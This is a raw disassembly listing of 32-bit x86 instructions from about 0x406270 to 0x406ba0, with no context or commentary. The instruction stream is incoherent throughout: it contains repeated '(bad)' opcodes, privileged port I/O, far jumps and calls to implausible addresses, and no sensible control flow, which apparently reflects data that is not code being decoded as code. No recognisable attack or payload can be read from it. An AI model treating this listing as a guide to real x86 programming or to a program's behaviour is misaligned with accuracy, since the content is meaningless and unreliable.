  406270:	mov    WORD PTR ds:0xd4971024,ds
  406276:	cld    
  406277:	or     BYTE PTR [ebp*4-0x6f0b16f8],cl
  40627e:	loope  0x406290
  406280:	mov    DWORD PTR [eax+ecx*1-0x1f621b9a],edx
  406287:	stc    
  406288:	cmp    ch,cl
  40628a:	mul    dl
  40628c:	dec    edi
  40628d:	pop    edi
  40628e:	pop    es
  40628f:	rcr    DWORD PTR [esi+0x59],0x49
  406293:	jmp    0x5144c1e2
	...
  4062ac:	rcr    edx,1
  4062ae:	div    BYTE PTR [esi]
  4062b0:	es xchg edi,eax
  4062b2:	pusha  
  4062b3:	xor    edx,eax
  4062b5:	push   esp
  4062b6:	or     BYTE PTR [esi],ah
  4062b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062b9:	popf   
  4062ba:	loopne 0x40629a
  4062bc:	push   edx
  4062bd:	jmp    0x2d44c3b8
  4062c2:	test   BYTE PTR [esi],0x12
  4062c5:	jl     0x4062fd
  4062c7:	call   0x64c5f75b
  4062cc:	int    0xea
  4062ce:	div    dh
  4062d0:	pop    esi
  4062d1:	icebp  
  4062d2:	mov    esi,0x84e9f222
  4062d7:	ins    BYTE PTR es:[edi],dx
  4062d8:	into   
  4062d9:	jmp    0x91bc:0xea38def6
  4062e0:	fucompp 
  4062e2:	test   cl,0xe7
  4062e5:	and    cl,BYTE PTR [eax]
  4062e7:	jmp    0xbff47202
  4062ec:	shr    ecx,0x47
  4062ef:	out    0x13,al
  4062f1:	in     eax,dx
  4062f2:	pop    es
  4062f3:	jmp    0xabdd7a87
  4062f8:	stos   BYTE PTR es:[edi],al
  4062f9:	jmp    0x84cef9f4
  4062fe:	or     cl,ch
  406300:	(bad)  
  406301:	pusha  
  406302:	ins    DWORD PTR es:[edi],dx
  406303:	pop    esp
  406304:	dec    esi
  406305:	mov    ebp,0x7a9d0058
  40630a:	inc    edi
  40630b:	inc    ecx
  40630c:	cmc    
  40630d:	jl     0x4062dd
  40630f:	mov    dh,0x0
	...
  406321:	add    BYTE PTR [eax],al
  406323:	add    ch,ah
  406325:	xchg   esp,eax
  406326:	add    eax,eax
  406328:	clc    
  406329:	xchg   ecx,eax
  40632a:	loope  0x4062dd
  40632c:	cmc    
  40632d:	xchg   esp,eax
  40632e:	or     BYTE PTR [ebp-0x9a9a8],cl
  406334:	inc    edx
  406335:	sbb    DWORD PTR [edx+0x2c],ecx
  406338:	adc    eax,0xf44fe6fd
  40633d:	xchg   esp,eax
  40633e:	loopne 0x4062e9
  406340:	cmp    edx,DWORD PTR [eax-0x1e9af4f8]
  406346:	or     ebp,ecx
  406348:	pop    ecx
  406349:	nop
  40634a:	or     BYTE PTR [eax],al
  40634c:	std    
  40634d:	aaa    
  40634e:	inc    eax
  40634f:	inc    ecx
  406350:	mov    ch,0x67
  406352:	jge    0x406360
  406354:	lea    ebp,[esi]
  406356:	(bad)  
  406357:	inc    DWORD PTR [edx-0x6c3d62e7]
  40635d:	imul   esi,edi,0x5ab8278d
  406363:	push   eax
  406364:	lea    esp,[esi-0x3a]
  406367:	jmp    DWORD PTR [edx-0x3c]
  40636a:	cmc    
  40636b:	jne    0x4063d2
  40636d:	(bad)  
  40636e:	cmc    
  40636f:	jne    0x4063ce
  406371:	jl     0x40638d
  406373:	inc    DWORD PTR [edx+0x69]
  406376:	loopne 0x406371
  406378:	das    
  406379:	imul   esi,edi,0x4a17d6eb
  40637f:	sub    al,0xbc
  406381:	push   cs
  406382:	mov    esp,0x606902fe
  406387:	add    DWORD PTR [eax],eax
	...
  406399:	add    BYTE PTR [eax],al
  40639b:	add    BYTE PTR [edi-0x3701092d],dl
  4063a1:	pop    ds
  4063a2:	idiv   bh
  4063a4:	add    bh,BYTE PTR [edx+ebx*2-0x49]
  4063a8:	mov    ebp,?
  4063aa:	or     cl,BYTE PTR [ebx]
  4063ac:	dec    esp
  4063ad:	or     dh,0x67
  4063b0:	cmp    esp,DWORD PTR [esi-0x1efd0035]
  4063b6:	push   es
  4063b7:	call   0xffb49324
  4063bc:	repz mov al,ds:0x6eebfebf
  4063c2:	(bad)  
  4063c4:	sbb    BYTE PTR [eax+0x2d3cff74],bh
  4063ca:	mov    BYTE PTR [ebp+0x7c],bh
  4063cd:	std    
  4063ce:	dec    BYTE PTR [esp+esi*1]
  4063d1:	pop    ebp
  4063d2:	fiadd  DWORD PTR [eax-0x74]
  4063d5:	or     eax,0xfe032263
  4063da:	or     ch,bl
  4063dc:	mov    DWORD PTR [ebp+0xa],esp
  4063df:	add    BYTE PTR [ebp+edi*8+0x1cc0ad0],cl
  4063e6:	add    dl,BYTE PTR [edx-0x65]
  4063e9:	or     BYTE PTR [ebx],al
  4063eb:	call   0xffb4fbea
  4063f0:	je     0x40643b
  4063f2:	inc    ecx
  4063f3:	inc    DWORD PTR [ebx+0x7ac28e78]
  4063f9:	fidiv  WORD PTR [edx+0x50]
  4063fc:	jae    0x40639e
  4063fe:	mov    bh,0xfe
	...
  406414:	imul   ebp,esi,0x63
  406417:	add    BYTE PTR [edx],bl
  406419:	std    
  40641a:	or     al,BYTE PTR [ebp+0x1087ee4c]
  406420:	push   ebx
  406421:	(bad)  
  406422:	jb     0x406423
  406424:	add    DWORD PTR [ecx],edx
  406426:	jb     0x406427
  406428:	inc    ebx
  406429:	lds    edi,FWORD PTR [esi-0x4b]
  40642c:	mov    ebp,?
  40642e:	jno    0x4063e5
  406430:	hlt    
  406431:	ss jae 0x406433
  406434:	xor    al,0x94
  406436:	add    eax,0xb7e7234e
  40643b:	inc    esi
  40643c:	mov    BYTE PTR [esp+esi*1-0x52ecdf71],dl
  406443:	js     0x406418
  406445:	push   eax
  406446:	lea    eax,[esp+ecx*4]
  406449:	xchg   esp,eax
  40644a:	loope  0x4064c6
  40644c:	sbb    DWORD PTR [eax-0x193d5877],0x5fcc0f65
  406456:	or     ecx,DWORD PTR [ebp-0xeaa17b7]
  40645c:	mov    esp,edi
  40645e:	shl    DWORD PTR [edi-0x1c],cl
  406461:	retf   
  406462:	adc    edi,DWORD PTR [ebx-0x35]
  406465:	inc    ebx
  406466:	dec    esi
  406467:	icebp  
  406468:	(bad)  
  406469:	sti    
  40646a:	lock dec ebp
  40646c:	mov    ebx,0xb7c16de6
  406471:	jns    0x406453
  406473:	jp     0x406496
  406475:	call   0x4155a7
	...
  40648a:	add    BYTE PTR [eax],al
  40648c:	mov    edi,esp
  40648e:	fdivr  QWORD PTR [ecx-0x65]
  406491:	out    0x1d,al
  406493:	icebp  
  406494:	xchg   edi,eax
  406495:	sti    
  406496:	clc    
  406497:	dec    ebp
  406498:	mov    esp,esi
  40649a:	aaa    
  40649b:	inc    esi
  40649c:	nop
  40649d:	xchg   esp,eax
  40649e:	pushf  
  40649f:	mov    gs,WORD PTR [eax+0x14]
  4064a2:	and    eax,0xe5e67274
  4064a7:	in     eax,dx
  4064a8:	imul   edi,DWORD PTR [edx+eiz*8+0x7a],0xffffffd9
  4064ad:	pushf  
  4064ae:	fnstenv [edx]
  4064b0:	push   ebx
  4064b1:	out    0xdd,al
  4064b3:	mov    ecx,cs
  4064b5:	call   0x94cd6502
  4064ba:	loope  0x406444
  4064bc:	or     esi,ebx
  4064be:	mov    dh,0x7a
  4064c0:	cmp    eax,DWORD PTR [ebp+0x8]
  4064c3:	rol    DWORD PTR [eax+eiz*1],0x8
  4064c7:	jmp    0x6d473966
  4064cc:	jmp    0x990:0x54e90894
  4064d3:	jmp    0x71cffa67
  4064d8:	(bad)  
  4064d9:	xchg   esp,eax
  4064da:	or     BYTE PTR [ecx],dl
  4064dc:	add    BYTE PTR [ebx+0x49],0xe9
  4064e0:	add    al,0x10
  4064e2:	push   DWORD PTR [edi+0x76]
  4064e5:	in     eax,0x57
  4064e7:	sub    ebp,0x1066f6d8
  4064ed:	adc    al,bh
  4064ef:	pop    edi
	...
  406504:	push   esi
  406505:	in     eax,0xf6
  406507:	pushf  
  406508:	pop    edi
  406509:	out    0xf6,al
  40650b:	dec    esi
  40650c:	mov    bh,0x91
  40650e:	or     ecx,ebp
  406510:	(bad)  
  406511:	pop    ss
  406512:	lea    esi,[esi]
  406514:	xor    eax,0xa799f6e5
  406519:	and    al,0x40
  40651b:	test   al,0x8f
  40651d:	jl     0x406524
  40651f:	mov    ebx,0xe76ee5c8
  406524:	rcl    DWORD PTR [eax+ecx*1+0x1],0xca
  406529:	and    BYTE PTR [eax],cl
  40652b:	jmp    0xd8bc39ca
  406530:	jno    0x406517
  406532:	and    DWORD PTR [esi+edi*8-0x1a],0xfffffff6
  406537:	neg    BYTE PTR [esi-0x1a]
  40653a:	jl     0x40651d
  40653c:	test   DWORD PTR [edx],0xe5e5e6f5
  406542:	mov    esp,0xf6e5d6d9
  406547:	inc    ecx
  406548:	mov    WORD PTR [ebx+0xf12e908],ss
  40654e:	inc    DWORD PTR [eax]
  406550:	dec    ebx
  406551:	imul   esi,edi,0x50
  406554:	frstor [ecx]
  406556:	inc    eax
  406557:	inc    ecx
  406558:	and    eax,0x745217f9
  40655d:	nop
  40655e:	pusha  
  40655f:	push   es
  406560:	addr16 shl esi,1
  406563:	out    0x1d,eax
  406565:	or     BYTE PTR ss:[eax],al
	...
  40657c:	cs push ecx
  40657e:	jl     0x406591
  406580:	(bad)  
  406581:	nop
  406582:	test   DWORD PTR [ebp-0x8957e],eax
  406588:	xchg   ebp,eax
  406589:	imul   edi,DWORD PTR [ebp+0x8],0xd
  40658d:	retf   
  40658e:	repz (bad) 
  406590:	jp     0x4065fd
  406592:	mov    ebp,0xf76b6bf0
  406597:	call   0x37bfc1
  40659c:	iret   
  40659d:	mov    bh,0xe0
  40659f:	xchg   ecx,eax
  4065a0:	test   al,0x6b
  4065a2:	test   DWORD PTR [ebx],0x6812e475
  4065a8:	push   edx
  4065a9:	rol    DWORD PTR [edi+0x0],0x15
  4065ad:	jns    0x4065c4
  4065af:	int    0x7a
  4065b1:	imul   ebx,DWORD PTR [eax+0x6a],0xffffffb5
  4065b5:	shl    ch,0x75
  4065b8:	popf   
  4065b9:	js     0x4065f5
  4065bb:	std    
  4065bc:	jp     0x406629
  4065be:	loopne 0x4065d9
  4065c0:	lods   al,BYTE PTR ds:[esi]
  4065c1:	pop    ebp
  4065c2:	imul   DWORD PTR [eax-0x5d]
  4065c5:	mov    DWORD PTR [edi+0x0],0x75f7821f
  4065cc:	ins    DWORD PTR es:[edi],dx
  4065cd:	jo     0x406571
  4065cf:	(bad)  
  4065d0:	jp     0x40662f
  4065d2:	pusha  
  4065d3:	(bad)  
  4065d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065d5:	xlat   BYTE PTR ds:[ebx]
  4065d6:	imul   BYTE PTR [ecx-0x7a]
  4065d9:	pop    ebp
  4065da:	jge    0x4065e4
  4065dc:	mov    ebp,ss
  4065de:	xchg   ebx,eax
  4065df:	inc    BYTE PTR [eax]
	...
  4065f1:	add    BYTE PTR [eax],al
  4065f3:	add    BYTE PTR [ebx-0x2d],cl
  4065f6:	loop   0x4065cd
  4065f8:	(bad)  [esp+ecx*1-0x19dd6796]
  4065ff:	pop    es
  406600:	and    al,0x7a
  406602:	jno    0x406603
  406604:	sub    esi,DWORD PTR [ebx]
  406606:	out    0xfb,al
  406608:	and    eax,DWORD PTR [ecx+0x3bbbe804]
  40660e:	jo     0x40660f
  406610:	inc    ebp
  406611:	xor    bh,dh
  406613:	jmp    DWORD PTR [eax+0x76]
  406616:	outs   dx,DWORD PTR ds:[esi]
  406617:	push   0xbe5fed8c
  40661c:	sti    
  40661d:	call   0xf5ba6530
  406622:	(bad)  
  406623:	xlat   BYTE PTR ds:[ebx]
  406624:	cli    
  406625:	jb     0x406697
  406627:	leave  
  406628:	into   
  406629:	in     eax,0xa
  40662b:	push   ebp
  40662c:	pop    es
  40662d:	push   edx
  40662e:	mov    esp,es
  406630:	aam    0xb2
  406632:	mov    dh,0xfb
  406634:	mov    ebp,gs
  406636:	or     al,BYTE PTR [eax]
  406638:	adc    DWORD PTR [ecx],esi
  40663a:	jg     0x40668c
  40663c:	and    al,0x8d
  40663e:	fiadd  WORD PTR [eax-0x74]
  406641:	stos   BYTE PTR es:[edi],al
  406642:	out    0xb,al
  406644:	stos   DWORD PTR es:[edi],eax
  406645:	call   0xed8daea5
  40664a:	bound  edi,QWORD PTR [edx+0xb7082c7]
  406650:	int3   
  406651:	add    DWORD PTR [ecx],edx
  406653:	mov    ecx,edx
  406655:	test   ebx,esp
	...
  40666b:	add    BYTE PTR [edx+ecx*4-0x1dfe004f],cl
  406672:	jle    0x4066e9
  406674:	je     0x406660
  406676:	in     al,0x7
  406678:	je     0x4066a7
  40667a:	popa   
  40667b:	jmp    DWORD PTR [ebx-0x6c]
  40667e:	out    dx,al
  40667f:	icebp  
  406680:	arpl   sp,bp
  406682:	pusha  
  406683:	dec    esp
  406684:	push   ebx
  406685:	jecxz  0x40662e
  406687:	inc    edx
  406688:	xchg   esp,eax
  406689:	xchg   esp,eax
  40668a:	cmp    al,0x8b
  40668c:	xor    BYTE PTR ds:0xe33ab0a5,dl
  406692:	mov    ch,0x3f
  406694:	or     DWORD PTR [edi+edi*4],ebx
  406697:	ja     0x4066c4
  406699:	xchg   esp,eax
  40669a:	loope  0x40669f
  40669c:	mov    WORD PTR [edi],cs
  40669e:	and    al,0x8
  4066a0:	xchg   esp,edx
  4066a2:	sbb    al,0x1
  4066a4:	or     al,0x9c
  4066a6:	loope  0x406698
  4066a8:	nop
  4066a9:	in     eax,dx
  4066aa:	in     al,dx
  4066ab:	add    al,0x8c
  4066ad:	xchg   esp,eax
  4066ae:	mov    ?,ecx
  4066b0:	mov    esp,ebx
  4066b2:	sti    
  4066b3:	pop    es
  4066b4:	in     al,0xef
  4066b6:	test   eax,0x1143eb77
  4066bb:	ja     0x406716
  4066bd:	mov    WORD PTR [ecx-0x22],ds
  4066c0:	(bad)  
  4066c2:	push   ebp
  4066c3:	ins    BYTE PTR es:[edi],dx
  4066c4:	xchg   edx,eax
  4066c5:	int3   
  4066c6:	pop    ebp
  4066c7:	ja     0x4066fd
  4066c9:	out    0x95,eax
  4066cb:	(bad)
  4066cf:	pop    es
	...
  4066e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066e5:	ret    
  4066e6:	cmp    DWORD PTR [edi-0x4d],esi
  4066e9:	or     al,0x64
  4066eb:	mov    esp,0xec25e2aa
  4066f0:	popa   
  4066f1:	xchg   ebp,eax
  4066f2:	loope  0x4066f7
  4066f4:	or     DWORD PTR [ecx],ebx
  4066f6:	and    esi,DWORD PTR [esi-0x6d]
  4066f9:	loop   0x4066ab
  4066fb:	imul   edx,esp,0xffffffcc
  4066fe:	add    eax,0x23181177
  406703:	jbe    0x406780
  406705:	loop   0x406697
  406707:	jbe    0x406742
  406709:	sbb    eax,0xe1e2f708
  40670e:	fbstp  TBYTE PTR [ebx+0x1e]
  406711:	xchg   ebp,eax
  406712:	or     BYTE PTR [eax+0xc],dh
  406715:	and    esi,esi
  406717:	(bad)  
  406719:	push   esp
  40671a:	pop    es
  40671b:	ins    DWORD PTR es:[edi],dx
  40671c:	sub    dl,BYTE PTR [ebp+0x814e908]
  406722:	retf   0xc2c7
  406725:	loope  0x406725
  406727:	jmp    0x4066c8
  406729:	xchg   esp,eax
  40672a:	or     cl,ch
  40672c:	cmp    esp,DWORD PTR [esi-0x7b]
  40672f:	push   esp
  406730:	int    0xe2
  406732:	mul    BYTE PTR [esi+0x39245704]
  406738:	and    al,dh
  40673a:	inc    esi
  40673b:	sub    BYTE PTR [eax-0x70a5a714],dl
  406741:	xchg   esp,eax
  406742:	add    ebp,DWORD PTR [ecx+0x23e393fc]
	...
  40675c:	add    eax,0x6277ca08
  406761:	loope  0x4066e7
  406763:	sub    esi,DWORD PTR [esp+eax*2+0x54d25960]
  40676a:	or     BYTE PTR [ecx-0x5e],dl
  40676d:	and    eax,0xd496e908
  406772:	jl     0x40675f
  406774:	ss push esp
  406776:	test   DWORD PTR [ebp+ecx*2-0x1e],ebx
  40677a:	idiv   BYTE PTR [esi]
  40677c:	add    al,0x57
  40677e:	and    al,0x60
  406780:	or     al,0x29
  406782:	imul   BYTE PTR [esi]
  406784:	sbb    ch,BYTE PTR [edi+eiz*4-0x4f]
  406788:	shl    cl,1
  40678a:	cmc    
  40678b:	xchg   esp,eax
  40678c:	mov    ebp,esp
  40678e:	xor    esp,DWORD PTR [edx]
  406790:	add    ah,dl
  406792:	not    BYTE PTR [ebx+esi*1-0x1e]
  406796:	test   BYTE PTR [eax],0x92
  406799:	(bad)
  40679c:	mov    esi,0xe8fff76a
  4067a1:	test   DWORD PTR [eax-0x18],ebx
  4067a4:	fimul  WORD PTR [esi-0x9]
  4067a7:	call   DWORD PTR [ebp+0x5d75f5c8]
  4067ad:	ins    DWORD PTR es:[edi],dx
  4067ae:	test   eax,0xe06762fe
  4067b3:	jns    0x40679f
  4067b5:	test   WORD PTR [ebp-0x9a958],0xc7f2
  4067be:	cmc    
  4067bf:	mov    ch,0x0
	...
  4067d1:	add    BYTE PTR [eax],al
  4067d3:	add    BYTE PTR [ecx+0x4dfff76a],ah
  4067d9:	inc    ecx
  4067da:	mov    edx,0xc8622500
  4067df:	push   gs
  4067e1:	hlt    
  4067e2:	cmc    
  4067e3:	jmp    DWORD PTR [edx]
  4067e5:	addr16 mov ebp,0xf76713bc
  4067eb:	call   0x488e1d
  4067f0:	jb     0x406823
  4067f2:	mov    al,0xfe
  4067f4:	bound  esp,QWORD PTR [edi-0x20]
  4067f7:	dec    ecx
  4067f8:	sub    ah,BYTE PTR [edi-0x9]
  4067fb:	leave  
  4067fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4067fd:	mov    WORD PTR [eax],cs
  4067ff:	push   ebp
  406800:	pop    esi
  406801:	ins    BYTE PTR es:[edi],dx
  406802:	mov    eax,esp
  406804:	popa   
  406805:	addr16 jge 0x406814
  406808:	dec    ebp
  406809:	pop    ss
  40680a:	ret    
  40680b:	call   DWORD PTR [edx+0xd]
  40680e:	dec    ebp
  40680f:	cld    
  406810:	mov    esi,0x31840754
  406815:	cwde   
  406816:	or     BYTE PTR [eax],al
  406818:	int    0xce
  40681a:	pop    ecx
  40681b:	inc    ecx
  40681c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40681d:	addr16 jge 0x40681c
  406820:	jge    0x40684c
  406822:	ret    0x8cff
  406825:	xchg   ah,bl
  406827:	sub    ebx,DWORD PTR [bp+di]
  40682a:	retf   0xcbff
  40682d:	xchg   esi,eax
  40682e:	out    0x7,eax
  406830:	fs dec edx
  406832:	jle    0x406833
  406834:	imul   edx,DWORD PTR [esi+0xc701],0x0
	...
  40684b:	add    BYTE PTR [ebx-0x11],ah
  40684e:	loop   0x4068ba
  406850:	mov    edi,0xd9ff0cac
  406855:	shl    DWORD PTR [edx-0x63],0x56
  406859:	(bad)  
  40685a:	jnp    0x4068ac
  40685c:	mov    ah,0x16
  40685e:	fadd   DWORD PTR [eax-0x74]
  406861:	jge    0x4068e0
  406863:	jne    0x4067e9
  406865:	(bad)
  406868:	sub    esp,DWORD PTR [edi]
  40686a:	arpl   dx,bp
  40686c:	dec    edx
  40686d:	das    
  40686e:	jl     0x4068d8
  406870:	adc    BYTE PTR [ebx-0x76ed0035],bl
  406876:	jo     0x406860
  406878:	mov    BYTE PTR [ebx],dh
  40687a:	jl     0x40687b
  40687c:	pop    esp
  40687d:	xchg   ebp,eax
  40687e:	xchg   ebp,eax
  40687f:	push   ebx
  406880:	dec    ebp
  406881:	in     eax,dx
  406882:	(bad)  
  406884:	jns    0x40686b
  406886:	bound  edx,QWORD PTR [edx-0x16]
  406889:	data16 jl 0x406874
  40688c:	aad    0x37
  40688e:	jl     0x40688f
  406890:	fs pop ss
  406892:	fadd   DWORD PTR [eax-0x74]
  406895:	ds out 0xfb,al
  406898:	mov    ah,0x22
  40689a:	inc    ecx
  40689b:	inc    ebx
  40689d:	sbb    eax,0x2c5fa6e3
  4068a2:	or     edx,DWORD PTR [eax-0x4d]
  4068a5:	sub    BYTE PTR [ebx],al
  4068a7:	call   0xffbd1009
  4068ac:	mov    ah,0x15
  4068ae:	xor    eax,0xff
	...
  4068c3:	add    BYTE PTR [ebx-0x6811d16c],bl
  4068c9:	in     al,dx
  4068ca:	inc    eax
  4068cb:	cmp    eax,0x4127df8b
  4068d0:	xchg   esp,eax
  4068d1:	xchg   esp,eax
  4068d2:	mov    esp,0x25136888
  4068d7:	ja     0x4068b4
  4068d9:	push   0xffffffe1
  4068db:	jmp    0xbb4486f
  4068e0:	je     0x4068b7
  4068e2:	and    DWORD PTR [ebx+ebx*2+0xd],esi
  4068e6:	and    al,0x70
  4068e8:	pop    es
  4068e9:	mov    eax,ds:0x94ccbc3e
  4068ee:	popa   
  4068ef:	xor    ecx,DWORD PTR [eax+ebp*2+0x42a3dc1a]
  4068f6:	and    BYTE PTR [ebx+ebx*8],al
  4068f9:	in     al,dx
  4068fa:	int3   
  4068fb:	mov    dh,0x8c
  4068fd:	xchg   esp,eax
  4068fe:	jmp    0x545c:0x1e7e9843
  406905:	les    ebp,FWORD PTR [ebp+0x1cd48773]
  40690b:	sbb    BYTE PTR [esp+ebp*2+0x46],bl
  40690f:	xlat   BYTE PTR ds:[ebx]
  406910:	dec    esp
  406911:	xchg   esp,eax
  406912:	xor    DWORD PTR [ebx-0x7f],esi
  406915:	mov    WORD PTR [ecx+0x75def15b],ds
  40691b:	pop    esp
  40691c:	pop    edx
  40691d:	(bad)  
  40691e:	jge    0x406993
  406920:	loopne 0x4068c4
  406922:	mov    eax,ds:0x6ddedbad
  406927:	jae    0x406929
	...
  406939:	add    BYTE PTR [eax],al
  40693b:	add    dh,bl
  40693d:	sub    eax,0xd9410b29
  406942:	retf   0xc30d
  406945:	push   0xddbd5be9
  40694a:	dec    ebp
  40694b:	jae    0x406973
  40694d:	mov    bl,0x36
  40694f:	stc    
  406950:	xchg   ebx,eax
  406951:	in     al,dx
  406952:	pop    es
  406953:	dec    esi
  406954:	push   ds
  406955:	fcomip st,st(6)
  406957:	ret    
  406958:	mov    ebx,edi
  40695a:	jl     0x40694d
  40695c:	aaa    
  40695d:	shl    ebp,0x1e
  406960:	jmp    FWORD PTR [edx+0x2e]
  406963:	push   ss
  406964:	test   DWORD PTR [esi-0x2201c520],edx
  40696a:	not    BYTE PTR [ecx-0x16b6bd6f]
  406970:	fisub  WORD PTR [edi+0x0]
  406973:	add    DWORD PTR [ebp-0x1f],edx
  406976:	imul   dh
  406978:	aaa    
  406979:	inc    esi
  40697a:	pop    edx
  40697b:	sub    BYTE PTR [eax-0x180e8323],cl
  406981:	pushf  
  406982:	cmc    
  406983:	(bad)  
  406984:	mov    esi,0x513b866c
  406989:	fdivrp st(5),st
  40698b:	cmp    al,0x30
  40698d:	mul    BYTE PTR [edx]
  40698f:	mov    esp,0x755fdd9e
  406994:	cmp    DWORD PTR [ebp+0x8],edx
  406997:	scas   al,BYTE PTR es:[edi]
  406998:	adc    al,0x96
  40699a:	loopne 0x4069a3
  40699c:	popf   
  40699d:	(bad)  
  40699f:	adc    DWORD PTR [eax],eax
	...
  4069b1:	add    BYTE PTR [eax],al
  4069b3:	add    BYTE PTR [edx+0x7ee94942],al
  4069b9:	add    BYTE PTR [bx+di-0x2060],al
  4069be:	test   BYTE PTR [esi+0x285b7dd7],0x90
  4069c5:	fnstsw WORD PTR [ecx+eiz*8+0x47]
  4069c9:	cwde   
  4069ca:	cmc    
  4069cb:	outs   dx,BYTE PTR ds:[esi]
  4069cc:	pop    esi
  4069cd:	fnstsw WORD PTR [ebp+eiz*2+0x5e]
  4069d1:	add    BYTE PTR [bx+di+0x7c],dl
  4069d5:	shl    esi,1
  4069d7:	push   esi
  4069d8:	fmulp  st(4),st
  4069da:	leave  
  4069db:	in     eax,0x8f
  4069dd:	inc    edi
  4069de:	add    DWORD PTR [eax],0x59
  4069e1:	push   ss
  4069e2:	jne    0x4069f0
  4069e4:	mov    ch,0xe5
  4069e6:	sbb    al,0xff
  4069e8:	loopne 0x40696b
  4069ea:	div    DWORD PTR [ebp-0x47]
  4069ed:	bound  edi,QWORD PTR [ebp+0x8]
  4069f0:	jge    0x406a13
  4069f2:	jecxz  0x4069f3
  4069f4:	stos   BYTE PTR es:[edi],al
  4069f5:	bound  edi,QWORD PTR [ebp+0xc]
  4069f8:	lea    ecx,[esi]
  4069fa:	int    0xff
  4069fc:	mov    ah,BYTE PTR [eax-0x439af336]
  406a02:	sub    esp,0x6af455f6
  406a08:	jne    0x406a6c
  406a0a:	jge    0x406a20
  406a0c:	push   0xffffffe5
  406a0e:	push   es
  406a0f:	push   DWORD PTR [eax-0x2661f6c]
  406a15:	(bad)  
  406a16:	test   DWORD PTR [ebx],0x0
	...
  406a2c:	cmc    
  406a2d:	fist   DWORD PTR [edx-0x77]
  406a30:	jo     0x406a96
  406a32:	pusha  
  406a33:	sbb    BYTE PTR [ecx+0x60fef6d1],dl
  406a39:	fs loopne 0x406a48
  406a3c:	in     al,dx
  406a3d:	(bad)  
  406a3e:	imul   DWORD PTR [eax+0x25]
  406a41:	xchg   ecx,eax
  406a42:	out    0xbe,eax
  406a44:	push   ebp
  406a45:	arpl   WORD PTR [ebp+0x8],di
  406a48:	sbb    eax,0x1afff735
  406a4d:	shr    BYTE PTR [ecx],0x54
  406a50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a51:	cwde   
  406a52:	div    DWORD PTR [ebp+0x9]
  406a55:	inc    eax
  406a56:	stc    
  406a57:	enter  0x636a,0x60
  406a5b:	add    ebp,esi
  406a5d:	jae    0x406a15
  406a5f:	push   eax
  406a60:	push   0xffffffe5
  406a62:	push   cs
  406a63:	call   0x37cdc7
  406a68:	fnsave [edx-0x1473bea4]
  406a6e:	ja     0x406ae5
  406a70:	mov    eax,0xb3c85252
  406a75:	push   ebp
  406a76:	aam    0x1
  406a78:	mov    WORD PTR [esi-0x46],cs
  406a7b:	push   eax
  406a7c:	mov    ds:0x2be7f31f,eax
  406a81:	scas   al,BYTE PTR es:[edi]
  406a82:	jns    0x406a83
  406a84:	xchg   ebx,eax
  406a85:	jmp    DWORD PTR [esi-0x18]
  406a88:	lods   eax,DWORD PTR ds:[esi]
  406a89:	mov    al,0x79
  406a8b:	call   DWORD PTR [ebp-0x50]
  406a8e:	sbb    al,0x0
	...
  406aa4:	loope  0x406b1c
  406aa6:	push   0xc9f9b768
  406aab:	jmp    FWORD PTR [edx+0x61]
  406aae:	mul    edi
  406ab0:	xor    BYTE PTR [esi+0x615bff79],dh
  406ab6:	sbb    edx,DWORD PTR [eax+0x64]
  406ab9:	mov    ebx,0xbb4bff32
  406abe:	std    
  406abf:	adc    ebx,esp
  406ac1:	ret    0x7fd
  406ac4:	and    al,0x8c
  406ac6:	jns    0x406ac7
  406ac8:	xor    eax,DWORD PTR [esi-0x3f]
  406acb:	push   ebx
  406acc:	int    0xed
  406ace:	ja     0x406b45
  406ad0:	nop
  406ad1:	aad    0x74
  406ad3:	enter  0x2b1b,0x78
  406ad7:	jne    0x406b55
  406ad9:	popf   
  406ada:	push   esp
  406adb:	aad    0xd4
  406add:	cli    
  406ade:	ja     0x406adf
  406ae0:	jns    0x406abb
  406ae2:	(bad)  
  406ae4:	xor    ebp,0x12f31c52
  406aea:	js     0x406ab5
  406aec:	into   
  406aed:	mov    ebp,0x1217550a
  406af2:	mov    esp,es
  406af4:	fsubr  DWORD PTR [edx-0x2]
  406af7:	or     esp,esp
  406af9:	xchg   esp,eax
  406afa:	or     eax,0xf9dbcb3b
  406aff:	inc    ebx
  406b00:	cmp    BYTE PTR [esi+0x68],cl
  406b03:	(bad)  
  406b04:	mov    bh,0x6c
  406b06:	loope  0x406b0b
	...
  406b1c:	mov    ds:0x400bd91a,eax
  406b21:	push   ebp
  406b22:	loope  0x406b94
  406b24:	sbb    eax,ebx
  406b26:	cmp    eax,0x69ec93f6
  406b2b:	jo     0x406ac0
  406b2d:	fistp  DWORD PTR [eax+0x56eb8c02]
  406b33:	fld    TBYTE PTR [esi+0x7b03a040]
  406b39:	popa   
  406b3a:	add    eax,0x198cf970
  406b3f:	stc    
  406b40:	push   0xffffffdb
  406b42:	cmc    
  406b43:	fimul  DWORD PTR [ebp-0x1b4ef16c]
  406b49:	stos   BYTE PTR es:[edi],al
  406b4a:	popf   
  406b4b:	ret    0xda53
  406b4e:	push   ebx
  406b4f:	jo     0x406b9c
  406b51:	popa   
  406b52:	stc    
  406b53:	pop    ebx
  406b54:	lods   eax,DWORD PTR ds:[esi]
  406b55:	fcmovnu st,st(5)
  406b57:	outs   dx,DWORD PTR ds:[esi]
  406b58:	cmp    esp,DWORD PTR [ecx-0x3b]
  406b5b:	pop    esp
  406b5c:	mov    edx,0x556fcdd0
  406b61:	(bad)  
  406b62:	clc    
  406b63:	add    edi,DWORD PTR [ecx+0x5083cd0f]
  406b69:	fmul   DWORD PTR [edx+0x4]
  406b6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b6d:	xchg   ecx,eax
  406b6e:	scas   al,BYTE PTR es:[edi]
  406b6f:	stc    
  406b70:	xchg   ebx,eax
  406b71:	in     al,dx
  406b72:	mov    BYTE PTR [ebp+0x3],al
  406b75:	(bad)  [edi-0x37]
  406b78:	imul   DWORD PTR [ebx-0x78]
  406b7b:	ror    DWORD PTR [esp+edx*4+0x19],cl
  406b7f:	lahf   
	...
  406b94:	aas    
  406b95:	push   ebp
  406b96:	loope  0x406c06
  406b98:	cdq    
  406b99:	mov    DWORD PTR [edi],0xf5dad121
  406b9f:	hlt    
  406ba0:	xlat   BYTE PTR ds:[ebx]
